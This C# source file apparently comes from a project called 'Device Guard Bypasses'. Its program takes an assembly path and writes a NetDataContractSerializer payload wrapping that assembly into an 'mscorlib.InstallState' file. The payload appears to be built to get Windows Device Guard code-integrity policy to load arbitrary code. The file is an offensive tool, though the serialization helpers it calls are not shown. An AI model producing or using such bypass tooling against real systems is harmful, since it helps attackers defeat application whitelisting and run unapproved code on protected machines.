//  This file is part of Device Guard Bypasses
//
//  Device Guard Bypasses is free software: you can redistribute it 
//  and/or modify it under the terms of the GNU General Public License
//  as published by the Free Software Foundation, either version 3 of 
//  the License, or (at your option) any later version.
//
//  Foobar is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with Device Guard Bypasses. If not, see<http://www.gnu.org/licenses/>.

using CommonLib;
using System;

namespace CreateInstallState
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("Usage: assembly.dll mscorlib.InstallState");
                    Environment.Exit(1);
                }

                Serializer.SerializeToNetDataSerializer(args[1], 
                    new WrappedAssemblyObject(args[0]));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
